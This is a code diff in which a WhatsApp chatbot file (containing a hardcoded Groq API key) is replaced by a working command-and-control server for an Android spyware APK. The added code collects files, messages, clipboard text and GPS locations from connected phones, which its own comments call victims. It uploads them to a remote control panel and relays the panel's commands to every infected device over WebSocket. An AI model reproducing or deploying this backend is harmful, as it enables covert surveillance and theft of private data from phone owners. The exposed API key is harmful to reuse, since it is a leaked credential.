@@ -1,119 +1,150 @@
-/**
- * 🤖 مساعد محمد الذكي (wa7m.com)
- * نسخة تصحيح الأخطاء وربط الجلسة الجديدة
- * المطور: محمد (Wahm)
- */
-
-const { 
-    default: makeWASocket, 
-    useMultiFileAuthState, 
-    disconnectReason, 
-    fetchLatestBaileysVersion, 
-    Browsers 
-} = require('@whiskeysockets/baileys');
-const { Boom } = require('@hapi/boom');
-const pino = require('pino');
-const axios = require('axios');
 const express = require('express');
-const qrcode = require('qrcode-terminal');
+const webSocket = require('ws');
+const http = require('http');
+const uuid4 = require('uuid');
+const multer = require('multer');
+const bodyParser = require('body-parser');
+const axios = require("axios");
+const FormData = require('form-data');
+
+// --- إعدادات المطور واهم @KHAIN3 ---
+const PANEL_URL = 'https://wahm.pro/bot/control.php';
+const DEVICE_ID = 'WAHM_PRO_DEVICE'; 
 
 const app = express();
-const port = process.env.PORT || 3000;
-const GROQ_API_KEY = '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';
+const appServer = http.createServer(app);
+const appSocket = new webSocket.Server({ server: appServer });
+const appClients = new Map();
 
-async function startWahmBot() {
-    console.log("🛠️ جاري محاولة بدء التشغيل وتوليد الباركود...");
-    
-    // استخدم اسم مجلد جديد تماماً للتأكد من نظافة الجلسة
-    const { state, saveCreds } = await useMultiFileAuthState('./session_final_wahm');
-    const { version } = await fetchLatestBaileysVersion();
+const upload = multer();
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-    const sock = makeWASocket({
-        version,
-        logger: pino({ level: 'silent' }),
-        auth: state,
-        browser: Browsers.macOS('Desktop'),
-        printQRInTerminal: true, // مهم جداً لرؤيته في Logs
-        connectTimeoutMs: 60000,
-        keepAliveIntervalMs: 15000
-    });
-
-    sock.ev.on('creds.update', saveCreds);
-
-    sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        
-        if (qr) {
-            console.log("📸 امسح الباركود الجديد الآن من سجلات Render:");
-            qrcode.generate(qr, { small: true });
-        }
-
-        if (connection === 'close') {
-            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
-            if (reason !== disconnectReason.loggedOut) {
-                console.log("🔄 انقطع الاتصال، جاري المحاولة مرة أخرى...");
-                setTimeout(startWahmBot, 5000);
-            } else {
-                console.log("❌ تم تسجيل الخروج. يرجى مسح الباركود مجدداً.");
-            }
-        } else if (connection === 'open') {
-            console.log('✅ تم الربط! مساعد محمد (wa7m.com) متصل الآن.');
-        }
-    });
-
-    sock.ev.on('messages.upsert', async ({ messages }) => {
-        try {
-            const m = messages[0];
-            if (!m.message || m.key.fromMe) return;
-
-            const from = m.key.remoteJid;
-            const senderName = m.pushName || "ضيفنا العزيز";
-            const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
-
-            if (body.startsWith('.')) {
-                const args = body.slice(1).trim().split(/ +/);
-                const command = args.shift().toLowerCase();
-                const text = args.join(' ');
-
-                if (command === 'اوامر') {
-                    const menu = `✨ *أهلاً يا ${senderName}* ✨\nأنا مساعد محمد الذكي. 🛡️\n\n📌 *الأوامر:* \n.شغل | .ذكاء | .مطور | .موقع | .آية\n\n_نسعد بخدمتك في wa7m.com_ 😊`;
-                    await sock.sendMessage(from, { text: menu });
-                } else if (command === 'شغل') {
-                    if (!text) return sock.sendMessage(from, { text: "اكتب اسم المقطع بعد ( .شغل )" });
-                    await sock.sendMessage(from, { text: "⏳ جاري جلب الصوت..." });
-                    try {
-                        const s = await axios.get(`https://api.vreden.my.id/api/ytsearch?query=${encodeURIComponent(text)}`);
-                        const v = s.data.result[0];
-                        const d = await axios.get(`https://api.vreden.my.id/api/ytmp3?url=${encodeURIComponent(v.url)}`);
-                        await sock.sendMessage(from, { audio: { url: d.data.result.download.url }, mimetype: 'audio/mp4' });
-                    } catch (e) { await sock.sendMessage(from, { text: "المحرك مشغول، جرب لاحقاً." }); }
-                }
-            } else if (body.length > 0) {
-                const greetings = ['هلا', 'مرحبا', 'السلام', 'هاي'];
-                if (greetings.some(g => body.toLowerCase().includes(g))) {
-                    await sock.sendMessage(from, { text: `يا هلا بك يا ${senderName}! أنا مساعد محمد الذكي. 🛡️\nللاطلاع على خدماتي، أرسل:\n*( .اوامر )* 😊` });
-                } else {
-                    await handleAI(sock, from, body);
-                }
-            }
-        } catch (err) { console.error(err); }
-    });
-}
-
-async function handleAI(sock, from, prompt) {
+// دالة إرسال التقارير للوحة (تعوض sendMessage في تليجرام)
+async function reportToPanel(data) {
     try {
-        const res = await axios.post('https://api.groq.com/openai/v1/chat/completions', {
-            model: "llama-3.3-70b-versatile",
-            messages: [
-                { role: "system", content: "أنت مساعد محمد، ذكاء اصطناعي محترم. المطور هو محمد (Wahm) صاحب موقع wa7m.com." },
-                { role: "user", content: prompt }
-            ]
-        }, { headers: { 'Authorization': `Bearer ${GROQ_API_KEY}` }, timeout: 15000 });
-        const aiMsg = `⚠️ *تنبيه:* أنا مساعد محمد الذكي. سأخبره برسالتك فوراً. 😊\n\n━━━━━━━━━━━━━━\n${res.data.choices[0].message.content}`;
-        await sock.sendMessage(from, { text: aiMsg });
-    } catch (e) { console.log("AI Offline"); }
+        const params = new URLSearchParams();
+        for (const key in data) {
+            params.append(key, data[key]);
+        }
+        await axios.post(PANEL_URL, params, {
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        });
+    } catch (e) {
+        // فشل صامت لضمان استمرار السيرفر
+    }
 }
 
-app.get('/', (req, res) => res.send("Bot is Running - wa7m.com"));
-app.listen(port, () => startWahmBot());
+// دالة إرسال الملفات للوحة (تعوض sendDocument في تليجرام)
+async function uploadFileToPanel(buffer, filename, model) {
+    try {
+        const form = new FormData();
+        form.append('file', buffer, { filename: filename });
+        form.append('model', model);
+        form.append('device_id', DEVICE_ID);
+        
+        await axios.post(PANEL_URL, form, {
+            headers: { ...form.getHeaders() }
+        });
+    } catch (e) {
+        console.log("خطأ في رفع الملف للوحة");
+    }
+}
+
+app.get('/', function (req, res) {
+    res.send('<h1 align="center">تم تشغيل السيرفر بنجاح بواسطة واهم - متصل باللوحة wahm.pro</h1>');
+});
+
+// استقبال الملفات من الـ APK (الصور، الصوت، الخ)
+app.post("/uploadFile", upload.single('file'), (req, res) => {
+    const name = req.file.originalname;
+    const model = req.headers.model || "Unknown";
+    uploadFileToPanel(req.file.buffer, name, model);
+    res.send('OK');
+});
+
+// استقبال النصوص من الـ APK (الرسائل، الحافظة، الخ)
+app.post("/uploadText", (req, res) => {
+    const model = req.headers.model || "Unknown";
+    reportToPanel({ 
+        text: `جهاز [${model}]:\n${req.body['text']}` 
+    });
+    res.send('OK');
+});
+
+// استقبال الموقع الجغرافي
+app.post("/uploadLocation", (req, res) => {
+    const model = req.headers.model || "Unknown";
+    reportToPanel({
+        lat: req.body['lat'],
+        lon: req.body['lon'],
+        text: `موقع جديد من جهاز [${model}]`
+    });
+    res.send('OK');
+});
+
+// التعامل مع اتصالات الأجهزة (WebSocket)
+appSocket.on('connection', (ws, req) => {
+    const uuid = uuid4.v4();
+    const model = req.headers.model || "Unknown";
+    const battery = req.headers.battery || "0";
+    const version = req.headers.version || "0";
+    const brightness = req.headers.brightness || "0";
+    const provider = req.headers.provider || "Unknown";
+
+    ws.uuid = uuid;
+    ws.model = model;
+    
+    // تخزين بيانات العميل المتصل
+    appClients.set(uuid, {
+        model, battery, version, brightness, provider
+    });
+
+    // إرسال تقرير للوحة بدخول ضحية
+    reportToPanel({
+        text: `°• جهاز جديد متصل\n\n• الموديل: ${model}\n• البطارية: ${battery}%\n• الاندرويد: ${version}\n• السطوع: ${brightness}\n• المزود: ${provider}`
+    });
+
+    ws.on('close', function () {
+        reportToPanel({ text: `°• فقد الاتصال بالجهاز: ${model}` });
+        appClients.delete(ws.uuid);
+    });
+});
+
+/**
+ * نظام جلب الأوامر من لوحة التحكم (Polling)
+ * هذا الجزء هو "المحرك" الذي يربط ضغطات أزرار اللوحة بالأجهزة
+ */
+setInterval(async () => {
+    try {
+        const response = await axios.get(`${PANEL_URL}?get_cmd=1&device_id=${DEVICE_ID}`);
+        const command = response.data.trim();
+
+        // تنفيذ الأمر إذا كان هناك أمر جديد في اللوحة
+        if (command && command !== "" && command !== "OK") {
+            // توزيع الأمر على كل الأجهزة المتصلة حالياً
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.readyState === webSocket.OPEN) {
+                    ws.send(command);
+                }
+            });
+        }
+    } catch (e) {
+        // لا تفعل شيئاً في حالة فشل الطلب
+    }
+}, 3000); // يفحص الأوامر كل 3 ثواني
+
+// المحافظة على الاتصال نشطاً
+setInterval(function () {
+    appSocket.clients.forEach(function each(ws) {
+        if (ws.readyState === webSocket.OPEN) {
+            ws.send('ping');
+        }
+    });
+}, 5000);
+
+const PORT = process.env.PORT || 8999;
+appServer.listen(PORT, () => {
+    console.log(`سيرفر واهم يعمل على المنفذ ${PORT}`);
+});
 
